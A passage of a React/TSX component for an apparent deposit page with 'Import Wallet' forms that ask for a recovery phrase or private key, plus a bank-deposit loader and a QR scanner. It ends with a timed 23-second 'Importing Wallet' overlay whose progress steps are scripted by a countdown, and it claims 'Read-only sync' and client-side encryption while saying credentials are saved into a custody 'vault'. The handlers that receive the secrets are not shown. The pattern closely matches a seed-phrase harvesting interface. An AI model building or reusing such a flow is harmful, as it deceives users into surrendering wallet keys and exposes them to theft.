                      <h2 className="text-2xl sm:text-3xl font-bold tracking-tight text-white">
                        Import Using Recovery Phrase
                      </h2>
                      <p className="text-xs sm:text-sm text-neutral-400 leading-relaxed max-w-md mx-auto">
                        Enter your 12 or 24-word recovery phrase to restore your wallet connection securely.
                      </p>
                    </div>
                  </div>

                  {/* Form Body */}
                  <form onSubmit={handleImportRecoveryPhraseSubmit} className="space-y-5 max-w-2xl mx-auto w-full relative z-10">
                    <div className="space-y-2">
                      <div className="flex items-center justify-between text-xs">
                        <label className="font-bold tracking-wider text-neutral-300 uppercase flex items-center gap-2">
                          <span>Recovery Phrase</span>
                        </label>
                        <div className="flex items-center gap-2">
                          <span className={`text-[11px] font-mono px-2 py-0.5 rounded-md font-bold ${
                            validatePhrase(importPhrase).valid 
                              ? 'bg-emerald-500/10 border border-emerald-500/30 text-emerald-400' 
                              : 'bg-white/5 border border-white/10 text-neutral-400'
                          }`}>
                            Word Count: {getPhraseWords(importPhrase).length}
                          </span>
                          <button
                            type="button"
                            onClick={() => setShowRecoveryInfoModal(true)}
                            className="p-1 rounded-full text-neutral-500 hover:text-white hover:bg-white/10 transition-colors"
                            title="Help"
                          >
                            <HelpCircle className="w-4 h-4" />
                          </button>
                        </div>
                      </div>

                      <div className="relative">
                        <textarea
                          rows={4}
                          value={importPhrase}
                          onChange={(e) => setImportPhrase(e.target.value)}
                          placeholder=""
                          style={!showPhrase ? { WebkitTextSecurity: 'disc' } as any : {}}
                          className={`w-full font-mono text-xs sm:text-sm text-white bg-neutral-900 rounded-2xl p-4 pr-24 outline-none border transition-all leading-relaxed resize-none ${
                            validatePhrase(importPhrase).valid
                              ? 'border-emerald-500/60 ring-2 ring-emerald-500/30 bg-emerald-950/10 text-emerald-100'
                              : importPhrase.trim()
                              ? 'border-indigo-500/40 focus:border-indigo-500 ring-1 ring-indigo-500/20'
                              : 'border-white/10 focus:border-indigo-500'
                          }`}
                        />

                        {/* Action Tools Inside Input */}
                        <div className="absolute right-3 top-3 flex flex-col gap-2">
                          <button
                            type="button"
                            onClick={() => setShowPhrase(!showPhrase)}
                            className="p-2 rounded-xl bg-white/5 border border-white/10 hover:bg-white/10 active:scale-95 transition text-neutral-300 hover:text-white cursor-pointer"
                            title={showPhrase ? "Hide Phrase" : "Show Phrase"}
                          >
                            {showPhrase ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                          </button>
                          <button
                            type="button"
                            onClick={handlePastePhraseFromClipboard}
                            className="p-2 rounded-xl bg-white/5 border border-white/10 hover:bg-white/10 active:scale-95 transition text-emerald-400 cursor-pointer"
                            title="Paste from Clipboard"
                          >
                            <Copy className="w-4 h-4" />
                          </button>
                        </div>
                      </div>

                      {/* Live Validation Badge */}
                      {validatePhrase(importPhrase).valid && (
                        <motion.div 
                          initial={{ opacity: 0, y: -4 }}
                          animate={{ opacity: 1, y: 0 }}
                          className="p-3 rounded-xl bg-emerald-950/40 border border-emerald-500/40 text-emerald-300 text-xs flex items-center justify-between"
                        >
                          <div className="flex items-center gap-2">
                            <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0" />
                            <span className="font-semibold">Valid {getPhraseWords(importPhrase).length}-word recovery phrase verified</span>
                          </div>
                          <span className="font-mono text-[10px] text-emerald-400">Ready</span>
                        </motion.div>
                      )}
                    </div>

                    {/* Security Notice */}
                    <div className="p-4 rounded-2xl bg-neutral-900/80 border border-white/10 flex items-start gap-3.5 text-xs text-neutral-300">
                      <div className="p-2 rounded-xl bg-amber-500/10 border border-amber-500/20 text-amber-400 shrink-0 mt-0.5">
                        <ShieldAlert className="w-4 h-4" />
                      </div>
                      <div className="space-y-1 text-left">
                        <h5 className="font-bold text-white text-xs">Security Notice</h5>
                        <p className="text-[11px] text-neutral-400 leading-relaxed">
                          Enter only the recovery phrase of a wallet you own. Never share your seed phrase with anyone. Support agents will never ask for your recovery phrase.
                        </p>
                      </div>
                    </div>

                    {/* Pinned Import Button */}
                    <div className="pt-3 border-t border-white/10">
                      <button
                        type="submit"
                        disabled={!validatePhrase(importPhrase).valid}
                        className={`w-full rounded-2xl py-4 text-sm font-bold text-slate-950 shadow-xl transition-all flex items-center justify-center gap-2 ${
                          validatePhrase(importPhrase).valid
                            ? 'bg-gradient-to-r from-emerald-500 via-emerald-400 to-teal-400 hover:from-emerald-400 hover:to-teal-300 shadow-emerald-500/30 active:scale-[0.98] cursor-pointer'
                            : 'bg-neutral-800 text-neutral-500 border border-white/5 cursor-not-allowed opacity-60'
                        }`}
                      >
                        <Shield className="w-4 h-4" />
                        <span>Import Wallet</span>
                        <ChevronRight className="w-4 h-4" />
                      </button>
                    </div>
                  </form>
                </motion.div>
              )}

              {/* PRIVATE KEY IMPORT FULL SCREEN */}
              {step === 'wallet_import_key' && (
                <motion.div 
                  key="wallet_import_key"
                  initial={{ opacity: 0, scale: 0.98 }}
                  animate={{ opacity: 1, scale: 1 }}
                  exit={{ opacity: 0, scale: 0.98 }}
                  className="relative w-full rounded-[32px] bg-neutral-950 text-white p-6 sm:p-10 overflow-hidden ring-1 ring-white/10 shadow-2xl space-y-6"
                >
                  {/* Header */}
                  <div className="flex items-center justify-between relative z-10 pt-2">
                    <button 
                      type="button"
                      onClick={() => setStep('wallet_import_choose')}
                      className="flex h-7 w-7 items-center justify-center rounded-full bg-white/10 hover:bg-white/20 transition cursor-pointer"
                      title="Close"
                    >
                      <X className="h-3.5 w-3.5 text-white" />
                    </button>
                    <div />
                    <div className="w-7" />
                  </div>

                  {/* Hero Header */}
                  <div className="space-y-3 text-center max-w-lg mx-auto relative z-10 flex flex-col items-center">
                    <ImportWalletAnimatedLogo icon={Key} colorClass="text-indigo-400" />

                    <div className="space-y-1.5">
                      <h2 className="text-2xl sm:text-3xl font-bold tracking-tight text-white">
                        Import Using Private Key
                      </h2>
                      <p className="text-xs sm:text-sm text-neutral-400 leading-relaxed max-w-md mx-auto">
                        Enter your wallet private key to restore your wallet address into the application securely.
                      </p>
                    </div>
                  </div>

                  {/* Form Body */}
                  <form onSubmit={handleImportPrivateKeySubmit} className="space-y-5 max-w-2xl mx-auto w-full relative z-10">
                    <div className="space-y-2">
                      <div className="flex items-center justify-between text-xs">
                        <label className="font-bold tracking-wider text-neutral-300 uppercase flex items-center gap-2">
                          <span>Private Key</span>
                        </label>
                        <div className="flex items-center gap-2">
                          <button
                            type="button"
                            onClick={() => setShowPrivateKeyInfoModal(true)}
                            className="p-1 rounded-full text-neutral-500 hover:text-white hover:bg-white/10 transition-colors"
                            title="Help"
                          >
                            <HelpCircle className="w-4 h-4" />
                          </button>
                        </div>
                      </div>

                      <div className="relative">
                        <input
                          type={showKey ? 'text' : 'password'}
                          value={importKey}
                          onChange={(e) => setImportKey(e.target.value)}
                          placeholder=""
                          className={`w-full font-mono text-xs sm:text-sm text-white bg-neutral-900 rounded-2xl p-4 pr-24 outline-none border transition-all ${
                            validatePrivateKey(importKey).valid
                              ? 'border-emerald-500/60 ring-2 ring-emerald-500/30 bg-emerald-950/10 text-emerald-100'
                              : importKey.trim()
                              ? 'border-rose-500/40 focus:border-rose-500 ring-1 ring-rose-500/20'
                              : 'border-white/10 focus:border-indigo-500'
                          }`}
                        />

                        {/* Quick Actions */}
                        <div className="absolute right-3 top-1/2 -translate-y-1/2 flex items-center gap-1.5">
                          <button
                            type="button"
                            onClick={() => setShowKey(!showKey)}
                            className="p-2 rounded-xl bg-white/5 border border-white/10 hover:bg-white/10 active:scale-95 transition text-neutral-300 hover:text-white cursor-pointer"
                            title={showKey ? "Hide Private Key" : "Show Private Key"}
                          >
                            {showKey ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                          </button>
                          <button
                            type="button"
                            onClick={handlePasteKeyFromClipboard}
                            className="p-2 rounded-xl bg-white/5 border border-white/10 hover:bg-white/10 active:scale-95 transition text-indigo-400 cursor-pointer"
                            title="Paste from Clipboard"
                          >
                            <Copy className="w-4 h-4" />
                          </button>
                        </div>
                      </div>

                      {/* Live Validation Badge */}
                      {validatePrivateKey(importKey).valid && (
                        <motion.div 
                          initial={{ opacity: 0, y: -4 }}
                          animate={{ opacity: 1, y: 0 }}
                          className="p-3 rounded-xl bg-emerald-950/40 border border-emerald-500/40 text-emerald-300 text-xs flex items-center justify-between"
                        >
                          <div className="flex items-center gap-2">
                            <CheckCircle2 className="w-4 h-4 text-emerald-400 shrink-0" />
                            <div className="flex flex-col">
                              <span className="font-semibold">Valid private key format verified</span>
                              {detectNetworkFromPrivateKey(importKey) && (
                                <span className="text-[10px] text-emerald-400/80">Detected: {detectNetworkFromPrivateKey(importKey)}</span>
                              )}
                            </div>
                          </div>
                          <span className="font-mono text-[10px] text-emerald-400">Ready</span>
                        </motion.div>
                      )}
                    </div>

                    {/* Security Notice */}
                    <div className="p-4 rounded-2xl bg-neutral-900/80 border border-white/10 flex items-start gap-3.5 text-xs text-neutral-300">
                      <div className="p-2 rounded-xl bg-amber-500/10 border border-amber-500/20 text-amber-400 shrink-0 mt-0.5">
                        <ShieldAlert className="w-4 h-4" />
                      </div>
                      <div className="space-y-1 text-left">
                        <h5 className="font-bold text-white text-xs">Critical Security Notice</h5>
                        <p className="text-[11px] text-neutral-400 leading-relaxed">
                          Never share your private key with anyone and import only wallets you own. Anyone with access to your private key has full control over your assets.
                        </p>
                      </div>
                    </div>

                    {/* Pinned Import Button */}
                    <div className="pt-3 border-t border-white/10">
                      <button
                        type="submit"
                        disabled={!validatePrivateKey(importKey).valid}
                        className={`w-full rounded-2xl py-4 text-sm font-bold text-white shadow-xl transition-all flex items-center justify-center gap-2 ${
                          validatePrivateKey(importKey).valid
                            ? 'bg-gradient-to-r from-indigo-600 via-indigo-500 to-purple-600 hover:from-indigo-500 hover:to-purple-500 shadow-indigo-600/30 active:scale-[0.98] cursor-pointer'
                            : 'bg-neutral-800 text-neutral-500 border border-white/5 cursor-not-allowed opacity-60'
                        }`}
                      >
                        <Key className="w-4 h-4" />
                        <span>Import Wallet</span>
                        <ChevronRight className="w-4 h-4" />
                      </button>
                    </div>
                  </form>
                </motion.div>
              )}

              {/* STEP 3.10: PREPARING BANK TRANSFER FULL SCREEN LOADING INTERFACE */}
              {step === 'bank_preparing' && (
                <motion.div 
                  key="bank_preparing"
                  initial={{ opacity: 0, scale: 0.98 }}
                  animate={{ opacity: 1, scale: 1 }}
                  exit={{ opacity: 0, scale: 0.98 }}
                  className="relative w-full rounded-[32px] bg-neutral-950 text-white p-8 sm:p-14 text-center space-y-8 overflow-hidden ring-1 ring-emerald-500/20 shadow-2xl min-h-[520px] flex flex-col items-center justify-center"
                >
                  {/* Small X (Cancel) button top-left */}
                  <button
                    type="button"
                    onClick={() => setStep('methods')}
                    className="absolute top-6 left-6 flex h-9 w-9 items-center justify-center rounded-full bg-white/5 border border-white/10 text-neutral-400 hover:text-white hover:bg-white/10 active:scale-95 transition z-20 shadow-lg cursor-pointer"
                    title="Cancel"
                  >
                    <X className="w-4 h-4" />
                  </button>

                  {/* Premium background lighting & subtle animated gradients */}
                  <div className="pointer-events-none absolute inset-0 opacity-20">
                    <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[500px] h-[500px] rounded-full bg-emerald-600/20 blur-[140px] animate-pulse" />
                    <div className="absolute top-0 left-1/2 -translate-x-1/2 w-full h-32 bg-gradient-to-b from-emerald-500/10 to-transparent blur-xl" />
                  </div>

                  {/* Center Content Section */}
                  <div className="space-y-8 my-auto relative z-10 flex flex-col items-center justify-center max-w-lg mx-auto">
                    {/* Unique premium banking animation (continuous circular loading indicator + Landmark icon) */}
                    <div className="relative w-36 h-36 flex items-center justify-center my-2">
                      <div className="absolute inset-0 rounded-full bg-emerald-500/15 blur-xl animate-pulse" />
                      
                      {/* Dual continuous circular rotating rings */}
                      <div className="absolute inset-0 rounded-full border-2 border-emerald-500/20 border-t-emerald-400 border-r-teal-400 animate-spin [animation-duration:2.5s]" />
                      <div className="absolute inset-3 rounded-full border border-teal-500/15 border-b-emerald-400/80 animate-spin [animation-duration:6s] [animation-direction:reverse]" />
                      
                      {/* Center Landmark Banking Emblem */}
                      <div className="w-20 h-20 rounded-3xl bg-gradient-to-br from-emerald-950/90 via-slate-900 to-teal-950/90 border border-emerald-500/40 flex items-center justify-center relative shadow-2xl shadow-emerald-950">
                        <Landmark className="w-10 h-10 text-emerald-300 relative z-10 animate-pulse" />
                        <div className="absolute inset-0 rounded-3xl bg-emerald-500/15 blur-md" />
                      </div>
                    </div>

                    {/* Bold Heading & Single Status Message */}
                    <div className="space-y-3 text-center">
                      <h2 className="text-2xl sm:text-3xl font-black tracking-tight text-white">
                        Preparing Bank Deposit
                      </h2>
                      
                      {/* Single Supporting Status Message with smooth fade transition */}
                      <div className="min-h-[28px] flex items-center justify-center">
                        <AnimatePresence mode="wait">
                          <motion.p
                            key={bankStatusIndex}
                            initial={{ opacity: 0, y: 6 }}
                            animate={{ opacity: 1, y: 0 }}
                            exit={{ opacity: 0, y: -6 }}
                            transition={{ duration: 0.35, ease: 'easeOut' }}
                            className="text-xs sm:text-sm font-mono font-semibold text-emerald-400/90 tracking-wide"
                          >
                            {BANK_STATUS_MESSAGES[bankStatusIndex]}
                          </motion.p>
                        </AnimatePresence>
                      </div>
                    </div>
                  </div>
                </motion.div>
              )}

              {/* QR SCANNER MODAL DIALOG */}
              {isQrScannerOpen && (
                <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-md">
                  <motion.div 
                    initial={{ opacity: 0, scale: 0.9 }}
                    animate={{ opacity: 1, scale: 1 }}
                    exit={{ opacity: 0, scale: 0.9 }}
                    className="relative w-full max-w-md rounded-3xl bg-neutral-900 border border-white/15 p-6 text-white space-y-5 shadow-2xl"
                  >
                    <div className="flex items-center justify-between pb-4 border-b border-white/10">
                      <div className="flex items-center gap-2">
                        <QrCode className="w-5 h-5 text-indigo-400" />
                        <h3 className="text-base font-bold text-white">Scan Wallet QR Code</h3>
                      </div>
                      <button 
                        type="button"
                        onClick={() => setIsQrScannerOpen(false)}
                        className="p-1.5 rounded-xl bg-white/5 border border-white/10 text-neutral-400 hover:text-white"
                      >
                        <XCircle className="w-5 h-5" />
                      </button>
                    </div>

                    <div className="relative w-full aspect-square rounded-2xl bg-black border border-indigo-500/40 overflow-hidden flex flex-col items-center justify-center p-4">
                      <div className="w-56 h-56 border-2 border-indigo-400 rounded-2xl relative flex items-center justify-center">
                        <div className="absolute -top-1 -left-1 w-4 h-4 border-t-4 border-l-4 border-indigo-400 rounded-tl-sm" />
                        <div className="absolute -top-1 -right-1 w-4 h-4 border-t-4 border-r-4 border-indigo-400 rounded-tr-sm" />
                        <div className="absolute -bottom-1 -left-1 w-4 h-4 border-b-4 border-l-4 border-indigo-400 rounded-bl-sm" />
                        <div className="absolute -bottom-1 -right-1 w-4 h-4 border-b-4 border-r-4 border-indigo-400 rounded-br-sm" />

                        <motion.div 
                          className="w-full h-1 bg-gradient-to-r from-transparent via-indigo-400 to-transparent shadow-[0_0_15px_#818cf8]"
                          animate={{ y: [-90, 90, -90] }}
                          transition={{ repeat: Infinity, duration: 2.5, ease: 'easeInOut' }}
                        />
                      </div>

                      <p className="text-[11px] text-neutral-400 mt-4 text-center px-4">
                        Position the wallet QR code within the frame, or paste the decoded address string below.
                      </p>
                    </div>

                    <div className="space-y-2">
                      <label className="text-xs text-neutral-400">Pasted or Scanned QR String:</label>
                      <div className="flex gap-2">
                        <input
                          type="text"
                          value={qrScanInput}
                          onChange={(e) => setQrScanInput(e.target.value)}
                          placeholder="Paste QR payload or raw address..."
                          className="flex-1 bg-black border border-white/10 rounded-xl px-3 py-2 text-xs font-mono text-white outline-none focus:border-indigo-500"
                        />
                        <button
                          type="button"
                          onClick={() => {
                            if (qrScanInput.trim()) {
                              setManualAddress(qrScanInput.trim());
                              setManualAddressTouched(true);
                              const res = validateWalletAddress(qrScanInput.trim(), manualNetwork.type, manualNetwork.name);
                              if (res.valid) {
                                setManualAddressError(null);
                              } else {
                                setManualAddressError(res.error || null);
                              }
                              setIsQrScannerOpen(false);
                            }
                          }}
                          className="px-4 py-2 rounded-xl bg-indigo-600 text-xs font-bold text-white hover:bg-indigo-500 transition"
                        >
                          Apply
                        </button>
                      </div>
                    </div>
                  </motion.div>
                </div>
              )}

              {step === 'unavailable' && (
                <motion.div 
                  key="unavailable"
                  initial={{ opacity: 0, scale: 0.95 }}
                  animate={{ opacity: 1, scale: 1 }}
                  exit={{ opacity: 0, scale: 0.95 }}
                  className={`p-10 sm:p-12 rounded-[32px] border text-center space-y-8 ${
                    isDark ? 'bg-slate-900/90 border-white/10 backdrop-blur-xl shadow-2xl' : 'bg-white border-slate-200 shadow-2xl'
                  }`}
                >
                  <div className="w-20 h-20 mx-auto rounded-3xl bg-neutral-800/80 border border-white/10 flex items-center justify-center text-slate-300">
                    <AlertCircle className="w-10 h-10 text-slate-300" />
                  </div>
                  <div className="space-y-3">
                    <h2 className="text-3xl sm:text-4xl font-black tracking-tight text-white leading-tight">
                      Card payments are currently unavailable
                    </h2>
                    <p className="text-sm sm:text-base text-slate-400 max-w-md mx-auto leading-relaxed">
                      Please choose another payment method or contact support.
                    </p>
                  </div>

                  <div className="pt-4 max-w-md mx-auto">
                    <button 
                      type="button"
                      onClick={() => setStep('methods')}
                      className={`w-full py-5 rounded-2xl font-bold text-sm transition-all shadow-lg ${
                        isDark ? 'bg-slate-800/90 hover:bg-slate-700/90 text-white border border-white/10' : 'bg-slate-100 hover:bg-slate-200 text-slate-900'
                      }`}
                    >
                      Return to Deposit Methods
                    </button>
                  </div>
                </motion.div>
              )}
            </AnimatePresence>

      {/* 23-SECOND IMPORTING OVERLAY MODAL */}
      <AnimatePresence>
        {isImportingWallet && (
          <motion.div
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            exit={{ opacity: 0, scale: 0.95 }}
            className="fixed inset-0 z-[200] bg-black/90 backdrop-blur-xl flex items-center justify-center p-4 sm:p-6"
          >
            <div className="w-full max-w-lg rounded-[32px] bg-neutral-950 border border-white/10 p-8 sm:p-10 text-center space-y-6 shadow-2xl relative overflow-hidden">
              {/* Glow Backgrounds */}
              <div className="absolute -top-24 -left-24 w-60 h-60 bg-emerald-500/20 rounded-full blur-3xl pointer-events-none animate-pulse" />
              <div className="absolute -bottom-24 -right-24 w-60 h-60 bg-indigo-500/20 rounded-full blur-3xl pointer-events-none animate-pulse" />

              {/* Main Animated Icon */}
              <div className="relative w-24 h-24 mx-auto flex items-center justify-center">
                {!importSuccessState ? (
                  <>
                    <div className="absolute inset-0 rounded-full border-2 border-emerald-500/30 border-t-emerald-400 animate-spin" />
                    <div className="w-18 h-18 rounded-2xl bg-gradient-to-br from-neutral-900 to-neutral-950 border border-white/10 flex items-center justify-center shadow-xl">
                      <Shield className="w-10 h-10 text-emerald-400" />
                    </div>
                  </>
                ) : (
                  <motion.div 
                    initial={{ scale: 0.5, opacity: 0 }} 
                    animate={{ scale: 1, opacity: 1 }} 
                    className="w-20 h-20 rounded-full bg-emerald-500/20 border-2 border-emerald-500 flex items-center justify-center text-emerald-400"
                  >
                    <CheckCircle2 className="w-10 h-10 text-emerald-400" />
                  </motion.div>
                )}
              </div>

              <div className="space-y-2">
                <h3 className="text-2xl sm:text-3xl font-black tracking-tight text-white">
                  {!importSuccessState ? 'Importing Wallet' : 'Wallet Successfully Imported'}
                </h3>
                <p className="text-xs sm:text-sm text-neutral-400 leading-relaxed max-w-md mx-auto">
                  {!importSuccessState 
                    ? 'Securely synchronizing your wallet with the AVER custody network.'
                    : 'Your wallet credentials have been verified and saved securely into your vault.'
                  }
                </p>
              </div>

              {/* Synchronizing Steps & Progress */}
              <div className="space-y-4 text-left">
                {!importSuccessState ? (
                  <>
                    <div className="space-y-3 bg-white/5 p-4 rounded-2xl border border-white/5">
                      {[
                        'Authenticating wallet ownership',
                        'Establishing encrypted connection',
                        'Synchronizing blockchain balances',
                        'Retrieving transaction history',
                        'Finalizing wallet import'
                      ].map((stepMsg, i) => {
                        const isCompleted = i < Math.floor((23 - importSecondsLeft) / 4.6);
                        const isActive = i === Math.floor((23 - importSecondsLeft) / 4.6);
                        
                        return (
                          <div key={i} className={`flex items-center gap-3 text-xs font-bold ${isActive ? 'text-white' : isCompleted ? 'text-emerald-400' : 'text-neutral-600'}`}>
                            {isCompleted ? <Check className="w-4 h-4 text-emerald-400" /> : isActive ? <div className="w-4 h-4 rounded-full border-2 border-white animate-pulse" /> : <div className="w-4 h-4 rounded-full border-2 border-neutral-700" />}
                            {stepMsg}
                          </div>
                        );
                      })}
                    </div>
                    
                    <div className="space-y-4 pt-2">
                      <div className="flex items-center justify-between text-xs font-bold">
                        <span className="text-neutral-400">Synchronization progress</span>
                        <span className="text-white">{Math.min(100, Math.floor(((23 - importSecondsLeft) / 23) * 100))}%</span>
                      </div>
                      <div className="w-full h-3 rounded-full bg-neutral-900 border border-white/10 overflow-hidden p-0.5">
                        <motion.div 
                          className="h-full rounded-full bg-gradient-to-r from-emerald-500 via-teal-400 to-indigo-500"
                          initial={{ width: '0%' }}
                          animate={{ width: `${Math.min(100, Math.max(3, ((23 - importSecondsLeft) / 23) * 100))}%` }}
                          transition={{ ease: 'linear', duration: 0.5 }}
                        />
                      </div>
                      <div className="text-center pt-2">
                        <p className="text-xs text-neutral-500 font-bold uppercase tracking-wider">Estimated remaining</p>
                        <p className="text-xl font-black text-white">{importSecondsLeft} seconds</p>
                      </div>
                    </div>
                  </>
                ) : (
                  <motion.div 
                    initial={{ opacity: 0, y: 10 }}
                    animate={{ opacity: 1, y: 0 }}
                    className="p-4 rounded-2xl bg-emerald-950/40 border border-emerald-500/40 text-emerald-300 text-xs font-bold flex items-center justify-center gap-2"
                  >
                    <CheckCircle2 className="w-4 h-4 text-emerald-400" />
                    <span>Wallet successfully imported</span>
                  </motion.div>
                )}
              </div>
              
              {/* Security Badges */}
              <div className="grid grid-cols-3 gap-2 pt-4">
                {['End-to-end encrypted', 'Client-side verification', 'Read-only sync'].map((badge, i) => (
                    <div key={i} className="bg-white/5 border border-white/5 p-2 rounded-xl text-[9px] font-bold text-neutral-400 flex flex-col items-center gap-1">
                        {i === 0 ? <Lock className="w-3 h-3 text-white" /> : i === 1 ? <Shield className="w-3 h-3 text-white" /> : <RefreshCw className="w-3 h-3 text-white" />}
                        {badge}
                    </div>
                ))}
              </div>

              <div className="text-[11px] text-neutral-500 pt-2 border-t border-white/5">
                Protected by 256-bit client-side cryptographic encryption
              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>


        </div>

        </div>
      </div>
    </div>
  );
}
